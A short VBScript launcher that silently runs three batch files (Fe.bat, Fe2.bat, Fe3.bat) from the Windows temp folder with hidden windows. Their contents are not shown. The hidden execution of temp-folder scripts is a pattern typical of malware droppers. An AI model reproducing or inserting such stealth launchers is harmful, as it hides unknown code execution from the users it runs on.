Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "%temp%\Fe2.bat" & Chr(34), 0
Set WinScriptHost = Nothing
Dim WinScriptHost2
Set WinScriptHost2 = CreateObject("WScript.Shell")
WinScriptHost2.Run Chr(34) & "%temp%\Fe.bat" & Chr(34), 0
Set WinScriptHost2 = Nothing
Dim WinScriptHost3
Set WinScriptHost3 = CreateObject("WScript.Shell")
WinScriptHost3.Run Chr(34) & "%temp%\Fe3.bat" & Chr(34), 0
Set WinScriptHost3 = Nothing